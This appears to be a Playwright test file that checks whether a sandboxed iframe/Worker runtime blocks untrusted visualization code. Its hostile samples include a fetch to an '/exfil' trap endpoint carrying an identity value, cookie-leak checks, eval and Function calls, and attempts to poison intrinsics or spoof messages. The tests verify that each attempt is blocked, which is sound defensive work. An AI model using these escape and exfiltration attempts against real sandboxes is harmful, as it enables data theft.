import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import {createServer} from 'node:http';
import test from 'node:test';
import {spawnSync} from 'node:child_process';
import {build} from 'esbuild';
import {chromium} from 'playwright';
import {JS_LIMITS} from '../../services/browser-preview/runtime/js-scene.mjs';

const packageIdentity='a'.repeat(64);
const manifest={schema:'riffology.browser-js/v1',hostApi:'riffology.browser-host/v1',entry:'frontend/main.mjs',width:600,height:420};
const visualization={schema:'riffology.visualization/v1',protocol:'riffology.visual/v0.1',renderer:'javascript-canvas',metricKeys:['completed']};
const queuePath=new URL('../../services/browser-preview/runtime/fixtures/queue.py',import.meta.url).pathname;
const pythonTrace=(parameters,seed)=>{
 const code=`import importlib.util,json,sys\nspec=importlib.util.spec_from_file_location('fixture',sys.argv[1]);m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m);print(json.dumps(m.run(json.loads(sys.argv[2])),allow_nan=False,separators=(',',':')))\n`;
 const run=spawnSync('python3',['-I','-c',code,queuePath,JSON.stringify({parameters,seed})],{encoding:'utf8'});
 assert.equal(run.status,0,run.stderr);return JSON.parse(run.stdout);
};
const listen=async handler=>{const server=createServer(handler);await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));return server;};
const close=server=>new Promise((resolve,reject)=>server.close(error=>error?reject(error):resolve()));

async function fixture(t){
 const bundled=await build({entryPoints:['services/browser-preview/runtime/js-frame.mjs'],bundle:true,write:false,format:'iife',platform:'browser',target:'es2022',logLevel:'silent'});
 const script=bundled.outputFiles[0].text,scriptHash=createHash('sha256').update(script).digest('base64'),trapRequests=[],executionRequests=[];
 const trap=await listen((req,res)=>{trapRequests.push({url:req.url,cookie:req.headers.cookie??null});res.writeHead(200,{'access-control-allow-origin':'*'});res.end('trap');});
 const trapOrigin=`http://127.0.0.1:${trap.address().port}`;
 const execution=await listen((req,res)=>{
  executionRequests.push({url:req.url,cookie:req.headers.cookie??null});
  if(req.url!=='/js-frame.html'){res.writeHead(404);res.end();return;}
  res.writeHead(200,{
   'content-type':'text/html; charset=utf-8',
   'content-security-policy':`default-src 'none'; script-src 'sha256-${scriptHash}'; worker-src blob:; connect-src 'none'; img-src 'none'; style-src 'none'; base-uri 'none'; form-action 'none'`,
   'permissions-policy':'camera=(), microphone=(), geolocation=(), usb=(), storage-access=()',
   'set-cookie':'execution_secret=must-not-reach-project; Path=/; SameSite=Lax',
  });
  res.end(`<!doctype html><body><script>${script}</script>`);
 });
 const executionOrigin=`http://127.0.0.1:${execution.address().port}`;
 const app=await listen((req,res)=>{
  res.writeHead(200,{'content-type':'text/html; charset=utf-8','set-cookie':'app_secret=must-not-reach-frame; Path=/; SameSite=Lax'});
  res.end(`<!doctype html><div id="root"></div><script>
   window.messages=[];window.active=null;
   window.openFrontend=({source,revisionId,parameters,seed,trace})=>new Promise((resolve,reject)=>{
    window.closeFrontend();const iframe=document.createElement('iframe');iframe.sandbox='allow-scripts';iframe.src=${JSON.stringify(executionOrigin+'/js-frame.html')};iframe.className='runtime';document.querySelector('#root').append(iframe);
    const channel=new MessageChannel(),request={schema:'riffology.browser-runtime/v1',type:'run',requestId:'local-'+Math.random().toString(36).slice(2),packageIdentity:${JSON.stringify(packageIdentity)},input:{parameters,seed}};
    const timeout=setTimeout(()=>reject(Error('frontend-timeout')),5000);window.active={iframe,port:channel.port1,request};
    channel.port1.onmessage=event=>{const message=event.data;messages.push(message);if(message?.type==='connected'){channel.port1.postMessage({type:'initialize',payload:{request,revisionId,trace,visualization:${JSON.stringify(visualization)},frontend:{packageIdentity:${JSON.stringify(packageIdentity)},manifest:${JSON.stringify(manifest)},source}}});}if(message?.type==='ready'){clearTimeout(timeout);resolve(message);}if(message?.type==='error'){clearTimeout(timeout);reject(Object.assign(Error(message.text||message.code),{runtimeMessage:message}));}};
    iframe.onload=()=>iframe.contentWindow.postMessage({type:'connect'},'*',[channel.port2]);
   });
   window.paint=(index,token)=>{const {port,request}=active;port.postMessage({type:'paint',requestId:request.requestId,packageIdentity:request.packageIdentity,index,token});};
   window.closeFrontend=()=>{if(!active)return;active.port.postMessage({type:'terminate'});active.port.close();active.iframe.remove();active=null;};
   window.fixtureReady=true;
  </script>`);
 });
 t.after(async()=>{await Promise.all([close(app),close(execution),close(trap)]);});
 const browser=await chromium.launch({headless:true,...(process.env.CHROMIUM_PATH?{executablePath:process.env.CHROMIUM_PATH}:{channel:process.env.M1_BROWSER_CHANNEL||'chrome'})});t.after(()=>browser.close());
 const page=await browser.newPage({viewport:{width:900,height:700}}),browserLogs=[];page.on('console',message=>browserLogs.push(`console:${message.type()}:${message.text()}`));page.on('pageerror',error=>browserLogs.push(`pageerror:${error.message}`));page.on('requestfailed',request=>browserLogs.push(`requestfailed:${request.url()}:${request.failure()?.errorText}`));await page.goto(`http://localhost:${app.address().port}`);await page.waitForFunction(()=>window.fixtureReady);
 const open=async config=>{try{return await page.evaluate(config=>openFrontend(config),config);}catch(error){error.message+=` browserLogs=${JSON.stringify(browserLogs)}`;throw error;}};
 const pixel=async(x=4,y=4)=>page.evaluate(async({bytes,x,y})=>{const image=await createImageBitmap(new Blob([Uint8Array.from(bytes)],{type:'image/png'}));const surface=document.createElement('canvas');surface.width=image.width;surface.height=image.height;const context=surface.getContext('2d');context.drawImage(image,0,0);const rgb=context.getImageData(x,y,1,1).data;image.close();return '#'+[...rgb.slice(0,3)].map(value=>value.toString(16).padStart(2,'0')).join('');},{bytes:[...await page.frameLocator('iframe.runtime').locator('canvas').screenshot()],x,y});
 return {page,open,pixel,trapOrigin,trapRequests,executionRequests,browserLogs};
}

test('real Python trace drives revision-pinned JavaScript display across parameter, seed, refresh and return',{timeout:30000},async t=>{
 const f=await fixture(t),parametersA={servers:2,customers:8,arrival_rate:.8,service_rate:1},parametersB={...parametersA,customers:11};
 const traceA=pythonTrace(parametersA,7),traceB=pythonTrace(parametersB,19);
 assert.notDeepEqual(traceA,traceB);
 const source=`export function render(context){const ok=Object.isFrozen(context)&&context.packageIdentity==='${packageIdentity}'&&context.revisionId==='revision-a'&&context.parameters.customers===8&&context.seed===7&&context.snapshot.metrics.completed===8;return {schema:'riffology.browser-scene/v1',background:ok?'#11aa33':'#cc1122',marks:[{kind:'text',x:10,y:30,text:String(context.snapshot.metrics.completed),fill:'#000',size:16}]};}`;
 await f.open({source,revisionId:'revision-a',parameters:parametersA,seed:7,trace:traceA});await f.page.evaluate(index=>paint(index,1),traceA.snapshots.length-1);await f.page.waitForFunction(()=>messages.some(message=>message.type==='painted'&&message.token===1));assert.equal(await f.pixel(),'#11aa33');
 await f.page.reload();await f.page.waitForFunction(()=>window.fixtureReady);await f.open({source,revisionId:'revision-a',parameters:parametersA,seed:7,trace:traceA});await f.page.evaluate(index=>paint(index,1),traceA.snapshots.length-1);await f.page.waitForFunction(()=>messages.some(message=>message.type==='painted'&&message.token===1));assert.equal(await f.pixel(),'#11aa33');
 await f.open({source,revisionId:'revision-b',parameters:parametersB,seed:19,trace:traceB});await f.page.evaluate(index=>paint(index,1),traceB.snapshots.length-1);await f.page.waitForFunction(()=>messages.some(message=>message.type==='painted'&&message.token===1));assert.equal(await f.pixel(),'#cc1122');assert.equal(await f.page.locator('iframe.runtime').count(),1);
});

test('opaque JavaScript frame contains network, cookies, parent DOM and storage and rejects hostile output',{timeout:30000},async t=>{
 const f=await fixture(t),parameters={servers:1,customers:3,arrival_rate:1,service_rate:1},trace=pythonTrace(parameters,2);
 const isolated=`export async function render(context){let blocked=typeof document==='undefined'&&typeof parent==='undefined'&&typeof localStorage==='undefined'&&typeof __riffologyPost==='undefined'&&typeof __riffologyFreeze==='undefined'&&typeof __riffologyBase==='undefined'&&typeof safePost==='undefined'&&typeof freeze==='undefined';Object.freeze=()=>{throw Error('poisoned-freeze')};Object.values=()=>{throw Error('poisoned-values')};globalThis.structuredClone=()=>{throw Error('poisoned-clone')};try{globalThis['indexedDB'].open('exfil');blocked=false;}catch{}try{await globalThis['fetch']('${f.trapOrigin}/exfil?identity='+context.packageIdentity);blocked=false;}catch{}try{globalThis['Function']('return 1')();blocked=false;}catch{}try{globalThis['eval']('1');blocked=false;}catch{}try{const nested=new globalThis['Worker'](URL.createObjectURL(new Blob(['postMessage(1)'],{type:'text/javascript'})));nested.terminate();blocked=false;}catch{}return {schema:'riffology.browser-scene/v1',background:blocked?'#2255aa':'#dd1100',marks:[]};}`;
 await f.open({source:isolated,revisionId:'revision-isolated',parameters,seed:2,trace});await f.page.waitForTimeout(150);assert.equal(await f.pixel(),'#2255aa');assert.deepEqual(f.trapRequests,[]);assert.equal(f.executionRequests.some(request=>request.cookie?.includes('app_secret')),false);
 const oversized=`export function render(context){return {schema:'riffology.browser-scene/v1',marks:[{kind:'text',x:0,y:20,text:'x'.repeat(300000),fill:'#000',size:8}]};}`;
 await assert.rejects(f.open({source:oversized,revisionId:'revision-oversized',parameters,seed:2,trace}),/runtime-js-(?:scene-invalid|mark-invalid|scene-limit)/);
 const spoof=`export function render(context){for(let i=0;i<40;i++)globalThis.postMessage({type:'scene',sequence:i,index:0,token:0,scene:{schema:'riffology.browser-scene/v1',background:'#ff0000',marks:[]}});return {schema:'riffology.browser-scene/v1',background:'#00ff00',marks:[]};}`;
 await assert.rejects(f.open({source:spoof,revisionId:'revision-spoof',parameters,seed:2,trace}),/runtime-js-(?:worker-message-invalid|capability-denied)/);
});

test('authored code cannot reach the fixed channel or poison captured platform intrinsics',{timeout:30000},async t=>{
 const f=await fixture(t),parameters={servers:1,customers:3,arrival_rate:1,service_rate:1},trace=pythonTrace(parameters,5);
 const source=`let synthetic=false;Object.freeze=()=>{throw Error('poisoned-freeze')};Object.values=()=>{throw Error('poisoned-values')};globalThis.structuredClone=()=>{throw Error('poisoned-clone')};\nexport function render(context){let isolated=Object.isFrozen(context)&&Object.isFrozen(context.snapshot);for(const name of ['__riffologyPost','__riffologyFreeze','safePost']){try{globalThis[name]({type:'scene'});isolated=false}catch{}}if(!synthetic){synthetic=true;dispatchEvent(new MessageEvent('message',{data:{type:'render',sequence:999,index:0,token:0,snapshot:{...context.snapshot,metrics:{completed:999}},event:null}}));}return {schema:'riffology.browser-scene/v1',background:isolated&&context.snapshot.metrics.completed!==999?'#117744':'#cc2200',marks:[]};}`;
 await f.open({source,revisionId:'revision-poison',parameters,seed:5,trace});assert.equal(await f.pixel(),'#117744');
});

test('actual pointer delivery is bounded to the per-second event budget',{timeout:30000},async t=>{
 const f=await fixture(t),parameters={servers:1,customers:3,arrival_rate:1,service_rate:1},trace=pythonTrace(parameters,3);
 const source=`export function render(context){return {schema:'riffology.browser-scene/v1',background:'#334455',marks:[{kind:'rect',id:'target',x:0,y:0,width:600,height:420,fill:context.event?'#556677':'#334455'}]};}`;
 await f.open({source,revisionId:'revision-events',parameters,seed:3,trace});
 const canvas=f.page.frameLocator('iframe.runtime').locator('canvas'),click=()=>canvas.click({position:{x:10,y:10}});
 // Real clicks can span seconds on CI. Control only the iframe's monotonic
 // budget clock; browser input, Worker rendering and timers stay real.
 await canvas.evaluate(()=>{
  window.__eventClockNow=1000;
  Object.defineProperty(performance,'now',{value:()=>window.__eventClockNow});
 });
 const painted=()=>f.page.evaluate(()=>messages.filter(message=>message.type==='painted'&&message.token===0).length);
 // Await each accepted render so a busy Worker cannot hide a missing limiter.
 for(let i=0;i<JS_LIMITS.eventsPerSecond;i++){
  await click();await f.page.waitForFunction(expected=>messages.filter(message=>message.type==='painted'&&message.token===0).length===expected,i+1);
 }
 for(let i=0;i<16;i++)await click();await f.page.waitForTimeout(250);
 assert.equal(await painted(),JS_LIMITS.eventsPerSecond);
 await canvas.evaluate(canvas=>{canvas.ownerDocument.defaultView.__eventClockNow=1999;});await click();await f.page.waitForTimeout(250);
 assert.equal(await painted(),JS_LIMITS.eventsPerSecond);
 await canvas.evaluate(canvas=>{canvas.ownerDocument.defaultView.__eventClockNow=2000;});await click();
 await f.page.waitForFunction(expected=>messages.filter(message=>message.type==='painted'&&message.token===0).length===expected,JS_LIMITS.eventsPerSecond+1);
});
